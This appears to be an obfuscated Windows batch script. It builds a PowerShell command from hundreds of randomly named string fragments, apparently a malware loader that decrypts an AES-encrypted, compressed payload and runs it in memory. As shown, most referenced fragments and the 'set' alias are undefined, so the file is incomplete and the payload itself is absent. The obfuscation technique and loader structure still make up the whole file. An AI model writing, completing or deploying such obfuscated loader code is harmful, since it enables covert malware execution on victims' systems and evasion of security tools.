@echo off
!ysgchHWyGarQTJdOJVAy! "LlQWKMxpwf=esaB"
!ysgchHWyGarQTJdOJVAy! "gNBxdKlJpx='[-1"
!ysgchHWyGarQTJdOJVAy! "xvniIpchjf=PEfP"
!ysgchHWyGarQTJdOJVAy! "tQVasWGLsW=);	$"
!ysgchHWyGarQTJdOJVAy! "ysERCszzCU=vAm8"
!ysgchHWyGarQTJdOJVAy! "FlGdCpBmoR=aes_"
!ysgchHWyGarQTJdOJVAy! "rRyAJqrIhS=ar $"
!ysgchHWyGarQTJdOJVAy! "akbVmWmEVd=$pay"
!ysgchHWyGarQTJdOJVAy! "hDnDADmsxI=ar;}"
!ysgchHWyGarQTJdOJVAy! "tYAizhPzbi=ssio"
!ysgchHWyGarQTJdOJVAy! "zFoBZeAolJ=th('"
!ysgchHWyGarQTJdOJVAy! "riCjuaWvFu=Subs"
!ysgchHWyGarQTJdOJVAy! "JGqZTJRcSd=herM"
!ysgchHWyGarQTJdOJVAy! "ggmTKShDhJ=llAd"
!ysgchHWyGarQTJdOJVAy! "OlpJKSrZIy=fore"
!ysgchHWyGarQTJdOJVAy! "kalTKsmXlT=Bloc"
!ysgchHWyGarQTJdOJVAy! "ilhfYJFjQF=ar.I"
!ysgchHWyGarQTJdOJVAy! "uhsPEFlPdm=Disp"
!ysgchHWyGarQTJdOJVAy! "wKQTAaudJl=ompr"
!ysgchHWyGarQTJdOJVAy! "lpgEUUCvEY=);	$"
!ysgchHWyGarQTJdOJVAy! "TwDguVbNbK=retu"
!ysgchHWyGarQTJdOJVAy! "iQwINiBkFY=.Ent"
!ysgchHWyGarQTJdOJVAy! "XsLQFLXkNu=XsJI"
!ysgchHWyGarQTJdOJVAy! "kZbslXTkcr=or_v"
!ysgchHWyGarQTJdOJVAy! "XRYyKdjuww=var."
!ysgchHWyGarQTJdOJVAy! "oIvGxCupTL=g=[S"
!ysgchHWyGarQTJdOJVAy! "rHjflZngNw=m;	$"
!ysgchHWyGarQTJdOJVAy! "SgOVaJGuwu=mpre"
!ysgchHWyGarQTJdOJVAy! "GdecXhLQEY=WH.S"
!ysgchHWyGarQTJdOJVAy! "VtCLYERxQv=DqIH"
!ysgchHWyGarQTJdOJVAy! "MueqgDmYlo=var "
!ysgchHWyGarQTJdOJVAy! "KwEVMhchJY=sPow"
!ysgchHWyGarQTJdOJVAy! "lyWhTDaaIO=ell\"
!ysgchHWyGarQTJdOJVAy! "NnRhMCKgDV= "
!ysgchHWyGarQTJdOJVAy! "plHvrPhHKt=\Win"
!ysgchHWyGarQTJdOJVAy! "haZRgxJDhX=v1.0"
!ysgchHWyGarQTJdOJVAy! "NzWQcgPMiB=\pow"
!ysgchHWyGarQTJdOJVAy! "ShEUeqBEOQ=dows"
!ysgchHWyGarQTJdOJVAy! "gczUQSQwRx=ell."
!ysgchHWyGarQTJdOJVAy! "UoyUeQGFOV=2\Wi"
!ysgchHWyGarQTJdOJVAy! "GLexlgwMqQ=tem3"
!ysgchHWyGarQTJdOJVAy! "cFpTnlAxcj=ersh"
!ysgchHWyGarQTJdOJVAy! "ERkjfMCgfN=exe""
!ysgchHWyGarQTJdOJVAy! "XlASlxHzUr="%systemdrive%"
!ysgchHWyGarQTJdOJVAy! "CSnlJSeKcP=\Sys"
!ysgchHWyGarQTJdOJVAy! "WdKePwYwMz=ndow"
!ysgchHWyGarQTJdOJVAy! "TPnYVousgT=erSh"
%XlASlxHzUr%%plHvrPhHKt%%ShEUeqBEOQ%%CSnlJSeKcP%%GLexlgwMqQ%%UoyUeQGFOV%%WdKePwYwMz%%KwEVMhchJY%%TPnYVousgT%%lyWhTDaaIO%%haZRgxJDhX%%NzWQcgPMiB%%cFpTnlAxcj%%gczUQSQwRx%%ERkjfMCgfN%%NnRhMCKgDV%%HDXordiZrL%%eLLnzVOjTS%%WjZtmBhZTN%%MHoBsHYFdJ%%lJAxYLybPh%%uYyEryEEbQ%%WifEZxwjUR%%XjfjGmIBuB%%dgkMsNiKjU%%duDnNdEWyA%%oogXklSoXf%%PdjANPXtll%%oMZaOCGSwD%%IMdTmOZnBh%%VUNeeZkcAY%%fkKmmCogjH%%FZStxdZpnY%%PKRdquZVVO%%sDsyxxbRHK%%ATdUCVbtHa%%aVPCivtHVR%%DtkvpbHuVZ%%biHCyVGWAv%%sFoVOwNQpc%%etVPhgJIFA%%nHxIZRnmdm%%PwhAzXfpHS%%oReTUHnSvr%%mXqZhKhGVW%%iAMcmImuqk%%btbNmvCDNr%%DvRMZRfhtP%%PytKJNfcGm%%vTBkpTWDMM%%hDSEsMJacv%%DfbBuCardz%%qAXBVKTGwg%%UBuGHlGOrX%%dfZlJqSaQM%%TFAnwHGqII%%TcDVBbKuTi%%WlZgvkALSF%%SSQKnpbhka%%EpgIdbBdKH%%GxhHQHFuRl%%gVydQalTHl%%aCjTDGfqcu%%IwbkZuLjTF%%JGqZTJRcSd%%PIvyHdnndj%%CorxCJTndv%%ocZcCtmkZU%%PcyYEaaDDW%%gxfJdupSwk%%QDZwOMItWo%%RdnjuAQsTB%%IpKhpQXpYh%%etNPdlcckR%%rHHpedkWpD%%EWZUBBTShX%%PtvOkxqygj%%xOibkbIucl%%GbavCitSnC%%rjUmbYlSfG%%NMPgfQNYKA%%TzQVqOsamb%%exkDRnTVZl%%PPpvyUlUpL%%uvhNJStZVn%%FlGdCpBmoR%%XRYyKdjuww%%DyKAHIpwUZ%%TUaMGEimSj%%sYGxODxJdF%%JZCzJhBfwU%%ZfroXcRlSg%%UWBndESmMd%%lGtoqUsAdy%%ddQYjnHrAL%%LlQWKMxpwf%%ootsJtLcXc%%KqitdRgDdP%%XAMasZPwEE%%xddYjOJypQ%%BEtxavdwTT%%FTlGhOCsaK%%DpytEHmkjo%%hHomotgpZX%%VtCLYERxQv%%lqyFnlfaSt%%iSnFLYFYsO%%HntcOkNNva%%QPtOcQjJZc%%ngwGOcfXaa%%ZSfcNYXvQd%%ysERCszzCU%%OVZpBBQMoL%%ePNvaXKrae%%TOSWDVBEdw%%DGvfldTPBm%%ilhfYJFjQF%%IhyybaddLG%%ZlIRhxuHjX%%eUQNVHGMXU%%prOyNwiXel%%aPdVmWCpXB%%oXaTAOqKCt%%tqgRqHxkeL%%pwCYXpQVAY%%erPvFsrUYZ%%fxvLRJJmFF%%zslmlRucWl%%XvkDocBKlX%%qCleFSbRgn%%FDqVzMfCjN%%XpXNcKmRwP%%iYaHoWghGt%%QCVJFteodC%%WYByZaEycV%%FkvreHCIGC%%FYVQXutoiI%%FYNTSjxCHo%%rIfKOGhEEX%%RvHBXXcKAE%%HqqtqGwByU%%kZbslXTkcr%%nPJkRjqmWU%%gMccGbrLuh%%jFfKNRupqZ%%eRIjrSGfCh%%qjFDNxXYMj%%FiQVhHJZxa%%ObWWQodTLO%%ulinQaaCWq%%TwDguVbNbK%%jGICspmIMy%%tenXPuZDeg%%GgdhgsyQCV%%nqRaENCGUB%%OsPxWPjFra%%WyJUdcDBva%%QvfRldmmsb%%RsJCsorFkr%%iSzCZPHWXC%%kalTKsmXlT%%CWmpiDOgCP%%LXrdRYWCSw%%wppQRQhPSZ%%bturPmGktw%%aAuhRmJhbM%%wJfPxmHvys%%vZoCNrDZoF%%sMjwvVVhZE%%gaOfDrnEUC%%FkLbabmRuz%%IJSwuKAJuB%%rzwTlvliZw%%dZfMZhahvu%%JdNzVwhrLT%%QEkslfNSPF%%PdSXvJDgwm%%JsnZSnLWXP%%nTxgFyONAU%%uhsPEFlPdm%%SaVyjxrkzX%%tQVasWGLsW%%UQFCSBayun%%cWTLWmXYXh%%hDnDADmsxI%%YzxgrcutGH%%xTQmVxXjef%%YIOlPqCcbp%%pIaMoCzMuT%%REspJoNbHc%%FdnrJqKlra%%AsrqsOSdYs%%YlPknuqyBA%%DBuZJluIdY%%SnutszmbXV%%wKcpetndeo%%alKRxZXsGg%%ujZaAKRvRN%%hoAGeSyfUq%%YrEOXGDDWt%%CUuRBmKcPt%%CRlqhLKdME%%ASxqhcFlcT%%hozylnTJfS%%hvpBNggnGm%%VzQrTJweJy%%GzaVlosNfU%%SbYUwfCWCb%%VsEQYIxhEB%%QPaGmIutpz%%OthMtUAWUN%%gABICnUkXD%%QkiDecbrIO%%KjHdmClSwe%%hBmRuqnreY%%OkwMIDlDIr%%SingdXTyva%%ccOTvoXrjO%%OJnJZzNUuI%%rHjflZngNw%%wPWdWMwCqu%%GUuUCjUEhD%%kYdMIvSJIv%%bRDMrZMjNn%%dkDacxmpCb%%eJZjmyLkvA%%UNUUsOqICC%%wKQTAaudJl%%iCgGrrStzS%%nCOmtpqJHo%%gDMaFtTfJm%%eIAjrrHoDb%%WXiKpTWDAk%%JLwvfEPgbX%%xNKnOFcEVb%%IcfFrjvcKL%%xqEyCsmeeM%%CBmFDinVVK%%RrIzCHFQdW%%jNvqAhilKv%%tYAizhPzbi%%VAgaTgHfVU%%MvaiDPfWfw%%abkAqTQzav%%SgOVaJGuwu%%zdqQIXXrEJ%%bSuFiUpGJa%%pheAcGHfiT%%iKALWXLtRt%%VyVqtZMiMf%%taLvesYQOb%%pSjLAqsIJl%%jVOpfQmOgc%%UzscziZfGE%%YVFPecpjPc%%HdyBWymvpo%%fjJMhQzhls%%qmbfmoqYlc%%BdYduQaRfb%%WEPsyOlTIn%%DiYxLubsoI%%hnjnNclFrq%%QHbjvMxJGx%%cwpYzseBra%%OHDxTIvCEw%%DFCrxVgObZ%%XsLQFLXkNu%%XKoqBieDqM%%qUekUwUXAD%%mqzrdwVMSi%%KkOkyTrlQo%%QDyoJcnBWi%%QZJkiHlWne%%nsLhcffULb%%fIhmMIRkIa%%juPJrLAEcR%%IvYLbxRrmD%%WtPVdiRxxz%%QannVSCbPr%%FBSUtJKwkp%%RAXfdPEUGj%%TdhCbHiKPi%%VQBVXvBVCt%%xvniIpchjf%%oIvGxCupTL%%BZHbuaYchI%%oIsmMxPYUL%%FaBJUmuVxv%%alcQRxNlOH%%raZARGpiTZ%%MvvhgAxYhh%%GdEMIdFCuo%%KEkmuFbbSn%%WmbxJEQUKr%%ZPeGbnvnRN%%aNNFphliNB%%zwfTkubgcd%%nLRdoVADlg%%jNjenjyviB%%tHhjRDJkwG%%lolOApVKru%%HIWHrLmbGb%%VGYAKFDIlK%%lpgEUUCvEY%%nNeNULLARg%%rIEvLFqKeV%%LnyGirBrMw%%iQwINiBkFY%%TdQfsCLLTo%%ESrImZpyEC%%ktNvXAlWHC%%efefbHwsnG%%GQxxSqzOvN%%SdFcOAqviS%%rPdqkyNlHE%%DWkYWtVpCG%%axAUKbAbqB%%rbjvoRMgnu%%DogQkWSGgu%%EaSCRTojGi%%XLVgnBMPJf%%HPcicMrKJO%%iTVVWriHDv%%CDzewSsZDJ%%jdWaNPYKze%%CEzSZePajW%%tfloCdpXMk%%urgaEfXVhh%%syhySYdHer%%csPHpdSIxK%%AaXpKkxznU%%hUScDVXMvE%%ZHTuhbByKB%%moxxHsASOI%%AEtkkiANeu%%ggmTKShDhJ%%JZOMHSwuvk%%ueYNduoJjZ%%BOupugcEMO%%lXLeYBQGCs%%LfrUabiyQp%%DytiiUFyrB%%PSIGZwtTOB%%EIgRnvwApt%%YDOwlNEDWe%%WrobCTxLVD%%IoKoLVrBVM%%yeiYCmelvl%%SQXKFntfot%%YLFMKKTzLp%%vcHjGRiqyq%%OlpJKSrZIy%%CmnBOMzwnS%%sEAfQQiNeN%%ecGYFNvWbS%%tTQnNjOgvT%%rLcGXkLjSU%%JDVVtzFpWa%%qDvuzzNnsG%%bbskvsaaav%%bldgjPYVTn%%DzkuCNqHhy%%wyRlTHkKzb%%zFoBZeAolJ%%BStecBRXHI%%csTCYDuRnB%%FnwROYkJvy%%nbwxXEeMir%%QmcRYgMMCv%%JIbKenwCqe%%riCjuaWvFu%%zIIWLslESH%%mxgZOEaLtJ%%hCveaHJSwY%%krhhWbafZL%%bRJIRTcDvQ%%akbVmWmEVd%%IshUxVqZcM%%EVMHIqSNmg%%FgxGXZpmUZ%%OwjVdJJOkW%%DcAImfytnW%%ezrOyCVBXy%%GdecXhLQEY%%GeCqDCFPtS%%AVZYVpeuxA%%NiRLqzYyKe%%tIOopZWalV%%WfheYKeggI%%cqsekymRad%%DhfpyRhKIV%%tejCEIaMNF%%vSrcbdqKdQ%%NfahrPaSGh%%DtxkoYgQAC%%yAeuILPdou%%AwHSioeckO%%HigFccugNc%%WAkAsmbFzG%%aXDlGgLFba%%UeGLUqtysF%%rJplyalhzW%%nyDEOKEUYV%%qPeNiRTyFc%%SCnTprHsNG%%UEffMvBbXk%%LzzwpBECcG%%gNBxdKlJpx%%clhsaMJYaN%%qSBvqtcQDN%%MfqgzhdHcb%%kRMAhAshwD%%SFBpqolfhJ%%IugBKXUaSS%%IbVYDzfboQ%%bVuaUgDbQl%%WXAttPLkPk%%FroDUQJCLR%%jkRqINafHD%%tTkHWKACFN%%NUldlKGRfd%%xapYbLgkLG%%OFDmQLgHGj%%qhXYdoYNfX%%giZDgsElFl%%EqRYYhqZnz%%EZkWNpdrVN%%MseNzGGafx%%hUbvFZpYZV%%XZAFthYdPQ%%pmqSymldzs%%BqUPsJXPqN%%ZesZPNRztr%%HCkpiUEjWs%%NlzGuHfLmK%%kiMbQkUqdL%%uMKiLYfFGy%%fOSYZOFMFh%%IgmJhzQjyX%%ZnglXbBqVw%%BAeOEwpObc%%FiLVcoAabl%%iWgJySIHaY%%moRjGicxfK%%jchvsRBkiJ%%BBpJnEtvqM%%OINdQqrCoU%%mcVqcfPKrH%%qxyqxLYiVb%%OGhsWBoeFb%%AYVnxyGZGh%%PIeIvrjxFf%%sjHngFVCtB%%RLfphrBlSZ%%eZBNlfCyXF%%rRyAJqrIhS%%DdFfqeDOBd%%PYEGasHUba%%cwENjZmEGQ%%aSeavbtwwh%%BNXTPtnRAq%%JxGgPhzSVq%%RYhLdXTDkZ%%ZlxUypzKYP%%MueqgDmYlo%%BBAgqDGlQS%%zJHBrxZMHA%%HOTfDwUREz%%KVsWxyKrDV%%InUfpdNDZI%
!ysgchHWyGarQTJdOJVAy! "gWxutgkBgE= /b"
!ysgchHWyGarQTJdOJVAy! "SWArqmsuMB=exit"
%SWArqmsuMB%%gWxutgkBgE%
